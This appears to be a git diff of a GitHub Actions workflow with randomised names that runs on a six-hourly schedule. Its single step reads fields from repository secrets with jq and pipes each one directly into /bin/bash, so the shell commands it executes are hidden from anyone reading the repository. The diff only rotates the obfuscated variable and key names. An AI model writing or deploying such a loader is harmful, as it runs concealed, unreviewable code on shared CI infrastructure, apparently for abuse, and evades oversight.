@@ -1,10 +1,11 @@
 name: meihaxi2513
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 3/6 * * *'
+    - cron: '32 5/6 * * *'
 
-jobs:  # 20504
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,16 +13,13 @@ jobs:  # 20504
       - uses: actions/checkout@v4
       - name: meihaxi2513
         env:
-          vb255: ${{ secrets.vb255 }}
+          dwqf93: ${{ secrets.dwqf93 }}
         run: |
-          echo $vb255 | jq -r .nk55 | /bin/bash
-          echo $m473 | jq -r .xid51 | /bin/bash
-          echo $cutrk79196 | jq -r .n5 | /bin/bash
-          echo $w4 | jq -r .wx7933 | /bin/bash
-          echo $rnmmc0322 | jq -r .nptxq0389 | /bin/bash
-          echo $ir232 | jq -r .bfyu965 | /bin/bash
-          echo $pp8038 | jq -r .pm2067 | /bin/bash
-          echo $q3500 | jq -r .k324 | /bin/bash
-          echo $v636 | jq -r .gq5 | /bin/bash
-          echo $k3 | jq -r .l49365 | /bin/bash
+          echo $dwqf93 | jq -r .ujrc29 | /bin/bash
+          echo $wfuak83325 | jq -r .y1338 | /bin/bash
+          echo $avur842 | jq -r .qxc908 | /bin/bash
+          echo $fi9970 | jq -r .dq197 | /bin/bash
+          echo $es50 | jq -r .ite5234 | /bin/bash
+          echo $wj75111 | jq -r .uswuz8279 | /bin/bash
+          echo $kkw3 | jq -r .zyw08 | /bin/bash
 
